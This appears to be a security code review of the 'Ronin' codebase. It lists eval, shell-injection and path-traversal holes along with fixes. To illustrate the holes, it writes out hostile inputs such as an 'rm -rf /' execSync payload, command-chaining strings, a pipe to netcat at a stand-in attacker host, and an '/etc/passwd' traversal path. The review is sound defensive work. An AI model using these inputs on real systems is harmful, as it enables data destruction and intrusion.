# Code Review: Security & Exception Handling

**Date:** 2026-02-12  
**Scope:** Ronin codebase - unhandled exceptions, security vulnerabilities

---

## Critical Security Issues

### 1. **WorkflowEngine uses `eval()` on user/agent-provided expressions** (HIGH)

**File:** `src/tools/WorkflowEngine.ts` (line 221)

```typescript
return eval(expr);
```

**Issue:** Workflow conditions (e.g. `$step1_success == true`) are evaluated via `eval()`. Conditions come from workflow definitions registered by agents via `api.tools.registerWorkflow()`. A malicious or compromised agent could register a workflow with a condition like:

```javascript
"1; require('child_process').execSync('rm -rf /')"
```

which would execute arbitrary code after variable substitution.

**Recommendation:** Replace `eval()` with a safe expression parser (e.g. a subset parser for `==`, `!=`, `&&`, `||`, or a library like `expr-eval`). Restrict to comparison operators and variable references only.

---

### 2. **LocalTools shell.safe allows command injection** (HIGH)

**File:** `src/tools/providers/LocalTools.ts` (lines 178-207)

**Issue:** The whitelist only validates the *first word* of the command: `args.command.split(' ')[0]`. The full `args.command` string is passed to `execAsync()`. Commands like:

- `ls; rm -rf /`
- `ls && id`
- `ls | nc attacker.com 1234`

would pass the whitelist (baseCmd = "ls") but execute arbitrary shell commands.

**Recommendation:** Either:
- Parse the full command and reject if it contains `;`, `|`, `&&`, `||`, `$()`, backticks, or newlines
- Or use an allowlist of exact command strings only (no arguments from AI)
- Or use `execFile` with an array of arguments instead of a shell string

---

### 3. **Font path traversal in AgentRegistry** (MEDIUM)

**File:** `src/agent/AgentRegistry.ts` (lines 245-261)

```typescript
if (path.startsWith("/fonts/")) {
  const fontPath = join(process.cwd(), "public", path);
  const file = Bun.file(fontPath);
```

**Issue:** The URL path (e.g. `/fonts/../../etc/passwd`) is joined directly. `path.startsWith("/fonts/")` is satisfied by `/fonts/../../etc/passwd`, and `join()` can resolve to a path outside `public/fonts/`.

**Recommendation:** Resolve and validate:

```typescript
const resolved = resolve(process.cwd(), "public", path);
const allowedBase = resolve(process.cwd(), "public", "fonts");
if (!resolved.startsWith(allowedBase + path.sep) && resolved !== allowedBase) {
  return new Response("Forbidden", { status: 403 });
}
```

---

## Medium Security Issues

### 4. **WranglerWrapper command injection** (MEDIUM)

**File:** `plugins/cloudflare/src/WranglerWrapper.ts`

```typescript
execSync(`wrangler tunnel create ${name}`, ...);
execSync(`pkill -f "wrangler tunnel run.*${name}"`, ...);
execSync(`wrangler tunnel delete ${tunnelId}`, ...);
```

**Issue:** `name` and `tunnelId` are interpolated into shell commands without sanitization. If these come from user input (e.g. tunnel name from config or API), an attacker could inject `; rm -rf /` or similar.

**Recommendation:** Validate `name` and `tunnelId` against a strict regex (e.g. alphanumeric + hyphen only). Use `spawn()` with argument arrays instead of interpolated strings where possible.

---

### 5. **menubar showNotification – unescaped single quotes** (LOW-MEDIUM)

**File:** `src/os/menubar.ts` (lines 399-410)

```typescript
let script = `display notification "${options.message.replace(/"/g, '\\"')}" with title "${options.title}"`;
...
execSync(`osascript -e '${script}'`);
```

**Issue:** Double quotes are escaped, but single quotes are not. A title like `O'Brien` would break the outer `osascript -e '...'` string and could allow script injection.

**Recommendation:** Also escape single quotes: `.replace(/'/g, "'\\''")` or use a more robust escaping approach.

---

### 6. **Guidelines path traversal** (LOW-MEDIUM)

**File:** `src/guidelines/index.ts` (loadGuideline, saveGuideline)

```typescript
const filepath = join(guidelinesDir, `${name}.md`);
```

**Issue:** If `name` is `../config` or `../../.ronin/config`, the resolved path escapes the guidelines directory. Callers may pass user-provided names.

**Recommendation:** Validate `name` to reject `..`, `/`, and path separators. Use `path.basename(name)` or a strict allowlist (alphanumeric, hyphen, underscore only).

---

### 0. **Hardcoded default password** (LOW – documentation)

**File:** `src/config/defaults.ts` (line 89)

```typescript
password: "roninpass",
```

**Issue:** Default config editor password is weak and well-known. Docs mention "change recommended" but the default is still weak.

**Recommendation:** Consider no default password and require explicit setup, or generate a random one on first run.

---

## Unhandled Exceptions / Robustness

### 7. **statusCommand calls process.exit(1) on error**

**File:** `src/cli/commands/status.ts`

When `statusCommand()` fails (e.g. fetch timeout), it calls `process.exit(1)`. If invoked from the interactive REPL, this terminates the entire Ronin process instead of surfacing an error in the REPL.

**Recommendation:** Throw or return an error instead of `process.exit(1)` when running in REPL context, or accept an option to avoid process exit.

---

### 8. **init.ts updateShellConfig – no validation of exportLine**

**File:** `src/cli/commands/init.ts` (lines 352-357)

`exportLine` is appended to `.bashrc`/`.zshrc`. If the value is crafted (e.g. contains newlines and trailing commands), it could inject arbitrary shell commands.

**Recommendation:** Validate `exportLine` format (e.g. `KEY=value` only, no newlines or `;`).

---

### 9. **Event emission endpoint has no authentication**

**File:** `src/agent/AgentRegistry.ts` (lines 265-279)

`POST /api/events/emit` accepts arbitrary `event` and `data` from the request body and emits to the internal event bus. There is no authentication or rate limiting.

**Context:** Server typically runs on localhost. If exposed (e.g. via tunnel or misconfiguration), any client could emit events and trigger agent behavior.

**Recommendation:** Add optional auth (e.g. API key or shared secret) when the server is bound to a non-localhost interface. Alternatively, bind to localhost only by default.

---

## Summary

| Severity | Count | Issues |
|----------|-------|--------|
| Critical | 2 | WorkflowEngine eval, LocalTools command injection |
| Medium   | 4 | Font path traversal, WranglerWrapper injection, menubar escaping, guidelines path |
| Low      | 2 | Default password, event endpoint auth |
| Robustness | 2 | statusCommand exit, init shell config |

**Priority fixes:** #1 (eval), #2 (shell.safe), #3 (font path).
